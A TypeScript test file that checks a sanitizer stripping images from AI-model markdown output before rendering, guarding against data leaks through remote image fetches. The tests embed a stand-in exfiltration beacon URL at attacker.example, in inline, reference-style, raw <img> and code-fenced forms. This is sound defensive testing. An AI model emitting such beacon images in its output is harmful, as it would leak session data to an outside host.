// Rendered, not just string-matched: the claim is that the markdown renderer the
// transcript uses emits no element that fetches a URL.
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { Streamdown } from "streamdown";
import { describe, expect, it } from "vitest";
import { stripModelImages } from "./model-markdown";

const BEACON = "https://attacker.example/collect?session=abc";

function render(markdown: string): string {
  return renderToStaticMarkup(
    createElement(Streamdown as never, { children: markdown } as never)
  );
}

describe("stripModelImages", () => {
  it("renders no fetching element for an inline remote image", () => {
    const html = render(stripModelImages(`Here you go: ![](${BEACON})`));
    expect(html).not.toMatch(/<img\b/i);
    expect(html).not.toContain("attacker.example");
  });

  it("renders no fetching element for a reference-style remote image", () => {
    const markdown = `Look: ![chart][beacon]\n\n[beacon]: ${BEACON}\n`;
    const stripped = stripModelImages(markdown);
    // The image reference is gone, so the definition below it renders nothing.
    expect(stripped).not.toContain("![");
    const html = render(stripped);
    expect(html).not.toMatch(/<img\b/i);
  });

  it("renders no fetching element for a raw <img> tag", () => {
    const html = render(stripModelImages(`<img src="${BEACON}">`));
    expect(html).not.toMatch(/<img\b/i);
    expect(html).not.toContain("attacker.example");
  });

  it("strips an image hidden inside a code fence", () => {
    const stripped = stripModelImages(`\`\`\`\n![](${BEACON})\n\`\`\``);
    expect(stripped).not.toContain("attacker.example");
  });

  it("keeps the alt text as prose", () => {
    expect(stripModelImages(`See ![the run graph](${BEACON}) above.`)).toBe(
      "See the run graph above."
    );
  });

  it("leaves ordinary markdown, including links, untouched", () => {
    const markdown = "**bold** and [a run](https://cloud.trigger.dev/runs/1)";
    expect(stripModelImages(markdown)).toBe(markdown);
  });
});
